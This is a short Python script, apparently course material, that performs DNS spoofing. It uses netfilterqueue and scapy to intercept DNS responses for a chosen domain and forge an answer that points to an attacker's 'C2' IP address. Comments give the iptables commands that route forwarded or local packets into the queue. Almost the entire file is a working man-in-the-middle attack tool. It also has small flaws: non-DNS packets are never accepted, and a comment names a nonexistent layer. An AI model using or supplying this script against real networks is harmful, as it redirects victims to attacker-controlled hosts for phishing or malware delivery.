#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
       queue_name = scapy_packet[scapy.DNSQR].qname# We are looking for dns response. For dns request, enter DNSRQ
       if "www.example.com" in str(queue_name):
           print('[+] Spoofing target')
           answer = scapy.DNSRR(rrname= queue_name, rdata="192.168.190.130")# We want to create a dns response involving our C2 ip
           scapy_packet[scapy.DNS].an = answer# We are employing our own dns answer
           scapy_packet[scapy.DNS].ancount = 1
           
           del scapy_packet[scapy.IP].len #We are deleting the original fields so that scapy refills them with our own C2 values
           del scapy_packet[scapy.IP].chksum
           del scapy_packet[scapy.UDP].chksum
           del scapy_packet[scapy.UDP].len
           
           packet.set_payload(bytes(scapy_packet)) # Because we converted the packet to a scapy packet and now we are changing it to a normal string and then to the original packet entered in the function.
           
       packet.accept()
        
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# iptables uses three different chains: input, forward, and output.
# To trap the packets it is needed to configure the IP tables
# iptables -I FORWARD -j NFQUEUE -- queue-num 0 (The packets only go to this chain if they are coming from a different computer
# To test this on your own local computer use these commands;
# iptables -I OUTPUT -j NFQUEUE -- queue-num 0 (The packets leaving the local computer)
# iptables -I INPUT -j NFQUEUE -- queue-num 0 (The packets coming to the local computer (from the local computer))
# #print(packet.get_payload())#get_payload is a method to see the actual content inside the packet itself
